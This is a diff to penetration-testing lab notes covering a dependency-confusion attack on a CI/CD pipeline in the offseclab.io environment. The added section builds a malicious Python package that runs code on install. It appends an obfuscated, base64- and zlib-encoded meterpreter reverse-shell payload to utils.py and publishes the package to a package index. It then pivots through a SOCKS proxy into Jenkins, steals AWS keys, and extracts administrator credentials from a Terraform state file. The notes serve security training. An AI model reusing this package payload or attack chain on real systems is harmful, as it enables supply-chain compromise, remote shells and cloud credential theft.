@@ -391,9 +391,9 @@ AWS Secret Access Key []: Oabcd...
 aws --profile attacker sts get-access-key-info --access-key-id  AKIA7890...
 ```
 
-## Dependency Chain Abuse
+## Dependency Chain Abuse to compromised Environment
 
-Trick a build system to download and run a harmful hijacked dependency to compromise the CI/CD pipeline.
+Trick a build system to download and run a harmful hijacked dependency to compromise the CI/CD pipelines, developer systems and the full AWS infrastructure.
 
 Scenario
 
@@ -404,23 +404,6 @@ Scenario
 * Exploit a vulnerability in a plugin to steal a AWS credentials
 * Find S3 the contains the AWS keys in Terraform state file using the stolen AWS credentials
 * Login and create backdoor account
-
-### Prepare PIP on kali to publish packages
-
-* create pip configuration on kali
-* configure a local pypi instance for lab
-
-```shell
-kali@kali:~$ mkdir -p ~/.config/pip/      
-kali@kali:~$ nano ~/.config/pip/pip.conf
-kali@kali:~$ cat ~/.config/pip/pip.conf
-[global]
-index-url = http://pypi.offseclab.io
-trusted-host = pypi.offseclab.io 
-# defining extra repo sources for pip includes public ones!!! 
-# packages with highest versions are prioritized
-extra-index-url = ... 
-```
 
 ### Enum available Services App, Jenkins buildserver, GIT
 
@@ -441,7 +424,6 @@ mkdir offseclab && cd offseclab
 curl -s app.offseclab.io
 wget -m -E -k -K -p -e robots=on -H -Dapp.offseclab.io -nd "http://app.offseclab.io"
 
-
 # Open Source intelligence
 # searching for the target's name on websites like Stack Overflow, Reddit, and other forums
 firefox http://forum.offseclab.io/
@@ -457,8 +439,6 @@ requirements.txt
   SQLAlchemy~=2.0.7
   hackshort-util~=1.1.0
 ```
-
-
 
 ### Dependency Chain Attack
 
@@ -484,8 +464,523 @@ Observations
 pip download hackshort-util
 
 ERROR: No matching distribution found for hackshort-util
+```
 
+### Creating PIP Packages
+
+This script setup.py will **build, distribute, and install the module with setuptools**. In this file, we will define the package and how to install it. Alternatives: pyproject.toml or setup.cfg.
+
+* Use setup.py to describe the package and later install it
+* *find_packages* searches for files within directory structure
+* Use init.py to describe the package function
+* Call *setup.py sdist* to create a package
+* PIP install empty package from dist directory
+
+```shell
+python3 -m venv venv && . venv/bin/activate
+pip install setuptools
+```
+
+```shell
+tree -r hackshort-util
+hackshort-util
+├── setup.py
+└── hackshort_util
+    └── __init__.py
+
+mkdir -p hackshort-util/hackshort_util
+
+# init.py is required for regualar packages
+touch hackshort-util/hackshort_util/__init__.py
+
+# setup.py to install package
+cat << 'EOF' > hackshort-util/setup.py
+from setuptools import setup, find_packages
+
+setup(
+  name='hackshort-util',
+  version='1.1.4',
+  packages=find_packages(),
+  classifiers=[],
+  install_requires=[],
+  tests_require=[],
+)
+EOF
+```
+
+```shell
+# Call *setup.py sdist* to create a package
+cd hackshort-util
+python3 ./setup.py sdist
+
+running sdist
+warning: sdist: standard file not found: should have one of README
+...
+Creating tar archive
+removing 'hackshort-util-1.1.4'
+
+# PIP install empty package from dist directory
+pip install dist/hackshort_util-1.1.4.tar.gz
+
+Installing collected packages: hackshort-util
+Successfully installed hackshort-util-1.1.4
+```
+
+```shell
+# Verify package install in a new shell 
+python3 -c "import hackshort_util; print(hackshort_util)"
+<module 'hackshort_util' from '/home/kali/venv/lib/python3.13/site-packages/hackshort_util/__init__.py'>
+
+# Works uninstall, to create the payload
+pip uninstall hackshort-util
+
+Successfully uninstalled hackshort-util-1.1.4
+```
+
+### Command Execution during Install
+
+Scenario
+
+* Use **setup.py** for command execution during package install
+* Prepare *InstallExec* class to run malicious code
+* e.g. spawn a reverse shell
+
+```shell
+tree -r hackshort-util
+hackshort-util
+├── setup.py       # <-- Execution during package install
+└── hackshort_util
+    └── __init__.py.py
+
+cat ./setup.py
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+
+class InstallExec(install):
+  def run(self):
+    install.run(self)
+    with open('/tmp/running_during_install', 'w') as f:
+      f.write('[!] Code execution during package install')
+
+setup(
+  name='hackshort-util',
+  version='1.1.4',
+  packages=find_packages(),
+  classifiers=[],
+  install_requires=[],
+  tests_require=[],
+  cmdclass={'install': InstallExec}
+)
+
+# Test 
+rm ./dist/hackshort_util-1.1.4.tar.gz
+
+# Install
+python3 ./setup.py sdist && pip install ./dist/hackshort_util-1.1.4.tar.gz
+cat /tmp/running_during_install
+[!] Code execution during package install
+```
+
+### Command Execution during Runtime
+
+Scenario
+
+* Use **utils.py** for command execution during package runtime
+* Jenkins build server loads functions from *utils.py* submodule
+* Utilize *__getattr__* as we don't known what gets called
+* Ensure proper exception handling to avoid execute stop
+
+```shell
+tree -r hackshort-util
+hackshort-util
+├── setup.py
+└── hackshort_util
+    └── __init__.py
+    └── utils.py   # <-- Execution during package runtime
+
+cat << 'EOF' > ./hackshort_util/utils.py
+import time
+import sys
+
+# any called function will continue doing nothing
+def standardFunction():
+  pass
+
+# get called when required function does not exist
+def __getattr__(name):
+  pass
+  return standardFunction
+
+# sleeping exection handler
+def catch_exception(exc_type, exc_value, tb):
+  while True:
+    time.sleep(1000)
+
+sys.excepthook = catch_exception
+
+EOF
+
+# Test 
+rm ./dist/hackshort_util-1.1.4.tar.gz
+python3 ./setup.py sdist && pip install ./dist/hackshort_util-1.1.4.tar.gz
+
+# Runtime
+# utils.run() does not fail
+# division by null does not fail either
+python3 -c "from hackshort_util import utils; utils.run(); 1/0"
 
 ```
 
+### Adding the Malicious Payload
 
+Scenario
+
+* Package Install and Runtime functionality has been tested successfully
+* Use **msvenom** to create a staged reverse_tcp shell in python3
+* Use **meterpreter** multi/handler to handle multiple shells 
+* Reason: We don't know how much environments install and call it
+
+```shell
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4488
+Payload size: 436 bytes
+
+# Add malicious payload to spawn a reverse shell when utils.py runs
+cat << 'EOF' >> hackshort-util/hackshort_util/utils.py
+
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0]))
+
+EOF
+
+# Create the malicious package
+pip uninstall hackshort-util && rm ./dist/hackshort_util-1.1.4.tar.gz
+python3 ./setup.py sdist && pip install ./dist/hackshort_util-1.1.4.tar.gz
+
+# Final test must spawn a reverse shell
+python3 -c "from hackshort_util import utils"
+```
+Attacker
+
+```shell
+sudo msfdb init
+msfconsole
+
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4488
+
+# allow multiple session to be spawned
+# -j run as jobs
+# -z don't interact immediately
+set ExitOnSession false
+run -jz
+
+sessions -i 1
+^Z
+```
+
+### Prepare PIP on kali to publish packages
+
+* create pip configuration on kali
+* configure the local pypi instance for lab
+
+### Publishing the Malicious Package
+
+* Real-World attack would compromise [pypi.org](https://pypi.org/) Package Index
+* Prepare PIP install packages from [pypi.offseclab.io](http://pypi.offseclab.io)
+* Prepare `~/.pypirc` resource file with user credentials for package publishing
+* Use **twine** to publish the malicious package tar.gz archive from dist
+
+```shell
+
+mkdir -p ~/.config/pip/      
+cat << 'EOF' > ~/.config/pip/pip.conf
+[global]
+index-url = http://pypi.offseclab.io
+trusted-host = pypi.offseclab.io 
+# defining extra repo sources for pip includes public ones!!! 
+# packages with highest versions are prioritized
+# extra-index-url = ...
+
+EOF
+```
+
+```shell
+cat << 'EOF' > ~/.pypirc
+[distutils]
+index-servers = 
+    offseclab 
+
+[offseclab]
+repository: http://pypi.offseclab.io/
+username: student
+password: password   
+
+EOF
+```
+
+```shell
+tree -r hackshort-util
+hackshort-util
+├── setup.py       # <-- Execution during package install
+└── hackshort_util
+    └── __init__.py
+    └── utils.py   # <-- Execution during package runtime
+
+# use pipy client twine upload package using twine
+twine upload --repository-url http://pypi.offseclab.io/ -u student -p password dist/*
+
+# verify the upload with user credentials
+curl -u 'student:password' http://pypi.offseclab.io/hackshort-util/json
+
+# remove, if bad package has been uploaded
+curl -u "student:password" \
+--form ":action=remove_pkg" \
+--form "name=hackshort_util" \
+--form "version=1.1.4" \
+http://pypi.offseclab.io/
+
+```
+
+### Enum Build System Environment
+
+Scenario
+
+* Initial reverse shell on build environment
+* Enum network using netscan.py to search for Jenkins
+
+Initial reverse shell on build environment
+
+```shell
+# get networks
+meterpreter ifconfig
+
+shell
+bash -i
+whoami
+root
+
+# root in a container
+mount
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/
+
+# print env to find credentials passed to container
+printenv
+
+# python3 is installed
+ls -lah . 
+ls -lah /bin /sbin | grep "python"
+
+# analyze database, etc.
+sqlite3 /data/data.db
+
+```
+
+Enum network using netscan.py to search for Jenkins
+
+* Use alternative to nmap tunneled via SSH
+* Reason: Very slow
+* Upload netscan.py and scan small network ranges /24
+
+```shell
+scp ./netscan.py kali@cloud-kali:/home/kali/
+
+# exit shell and upload via meterpreter
+^Z
+session -i 2
+upload netscan.py
+
+# scan networks for Jenkins other web services
+python3 netscan.py 
+Initiating scan for target IP: 172.18.0.1/24, port range ['80', '443', '8080']
+...
+Scanning 172.18.0.3
+Port 80: OPEN
+
+python3 netscan.py 
+Initiating scan for target IP: 172.30.0.30/24, port range ['80', '443', '8080']
+...
+Scanning 172.30.0.30
+Port 8080: OPEN
+...
+
+# Found Jenkins login on port 8080 with sign up function
+curl -vv http://172.30.0.30:8080
+curl -vv http://172.30.0.30:8080/login
+...
+
+<h1>Welcome to Jenkins!</h1>
+<a href="signup">create an account</a>
+```
+
+### Compromise Jenkins
+
+* Run socks 5 proxy on cloud-kali using meterpreter
+* Run local SSH tunnel to cloud-kali socks 5 proxy
+* Connect to Jenkins build server and create an account
+* Enum Jenkins plugins and find vulnerable [S3 Explorer](https://plugins.jenkins.io/s3explorer/)
+
+| ![Pivot to Jenkins via Socks 5 Proxy tunneled via SSH](./img/socks5-via-ssh-tunnel.png) |
+| :---: |
+| *Pivot to Jenkins via Socks 5 Proxy tunneled via SSH* |
+
+Run socks 5 proxy on cloud-kali using meterpreter
+
+```shell
+# configure socks_proxy with meterpreter
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+run -j
+
+# add network route for meterpreter sessions 2
+route add 172.30.0.1 255.255.0.0 2
+```
+
+| ![Show socks 5 proxy](./img/run-jobs-meterpreter-socks5.png) |
+| :---: |
+| *Show jobs to ensure socks 5 proxy is running* |
+
+Run local SSH tunnel to cloud-kali socks 5 proxy
+
+```shell
+# create and verify ssh tunnel to socks 5 proxy
+# -L local forwarding SSH tunnel
+# -N no command execute
+# -f run in background
+
+ssh -fN -L localhost:1080:localhost:1080 kali@cloud-kali
+ss -tulpn
+```
+
+Connect to Jenkins build server and create an account
+
+```shell
+# confiure socks 5 proxy on port 1080 for firefox
+# create a new account jenkins/jenkins
+firefox --preferences
+firefox 172.30.0.30:8080/login
+```
+
+| ![Jenkins connect via socks 5 proxy](./img/jenkins-http-via-socks5.png) |
+| :---: |
+| *Jenkins connect via socks 5 proxy* |
+
+| ![Enum Jenkins account](./img/jenkins-compromise.png) |
+| :---: |
+| *Jenkins compromised by creating a new account for enumeration* |
+
+### Exploit Jenkins Plugins
+
+* Enum jenkins pipelines and research plugins
+* Exploiting S3 Explorer to get AWS credentials from source code
+* Enum S3 bucket to find administrator credential in TF state
+
+Enum jenkins pipelines and research plugins
+
+| ![Security Advisory](./img/jenkins-plugin-vuln-s3-explorer.png) |
+| :---: |
+| *Jenkins plugin S3 Explorer vulnerability security advisory* |
+
+| ![S3 Explorer Source Code](./img/jenkins-plugin-open-source-s3-explorer.png) |
+| :---: |
+| *Jenkins plugin S3 Explorer file index.html, explorer.css, explorer.js* |
+
+Application consists of those three files only. Since the page is using JavaScript to explore an S3 Bucket, this means the AWS ID and key should be accessible in the source of the page.
+
+Exploiting S3 Explorer to get AWS credentials from source code
+
+* curl login to Jenkins hould have worked, but did NOT
+* Hence exfiltrate aws credential via UI "view page source"
+
+```shell
+curl -v \
+-c cookie \
+--proxy socks5://127.0.0.1:1080 \
+http://172.30.0.30:8080/login
+
+curl -v \
+-c cookie \
+--proxy socks5://127.0.0.1:1080 \
+-d "j_username=jenkins&j_password=jenkins&from=%2F&Submit=" \
+http://172.30.0.30:8080/j_spring_security_check
+
+curl -v \
+-b cookie \
+--proxy socks5://127.0.0.1:1080 \
+http://172.30.0.30:8080/
+```
+
+### Compromise AWS environment
+
+* Create a aws profile with the stolen keys
+* List the S3 buckets with stolen account
+* Copy the S3 buckets content to find TF-State with Admin credentials
+* Login into Admin account and create backdoor profile
+
+```shell
+aws --profile=stolen-s3 sts get-caller-identity
+
+    Arn: "arn:aws:iam::123456789012:user/s3_explorer"
+
+aws --profile=compromised-s3 iam list-user-policies --user-name s3_explorer
+
+    An error occurred (AccessDenied) ...
+
+# list all s3 bucket available for this account
+aws --profile=compromised-s3 s3api list-buckets
+{
+    "Buckets": [
+        {
+            "Name": "company-directory-4xm0tunr38t6vg90",
+            "CreationDate": "2025-11-22T13:01:49+00:00"
+        },
+        {
+            "Name": "msmeualz-offseclab-private",
+            "CreationDate": "2024-05-22T18:30:34+00:00"
+        },
+        {
+            "Name": "tf-state-4xm0tunr38t6vg90",
+            "CreationDate": "2025-11-22T13:01:49+00:00"
+        }
+    ],
+    "Owner": {
+        "ID": "7014489caa5b8816d5570b7456eb042d92a206050956d2dd4953a649eddf1091"
+    },
+    "Prefix": null
+}
+
+aws --profile=compromised-s3 s3 cp s3://tf-state-4xm0tunr38t6vg90/terraform.tfstate .
+cat terraform.tfstate
+
+"user_list": {
+      "value": [
+        {
+          "email": "Goran.Bregovic@offseclab.io",
+          "name": "Goran.B",
+          "phone": "+1 555-123-4567",
+          "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
+        },
+...
+"instances": [
+ {
+          "index_key": "Goran.B",
+          "schema_version": 0,
+          "attributes": {
+            "id": "AK...",
+            "secret": "Oax...",
+            "ses_smtp_password_v4": "BIx...",
+            "status": "Active",
+            "user": "Goran.B"
+
+# login as goran.b and verify he has still AdministratorAccess
+aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}
+
+```
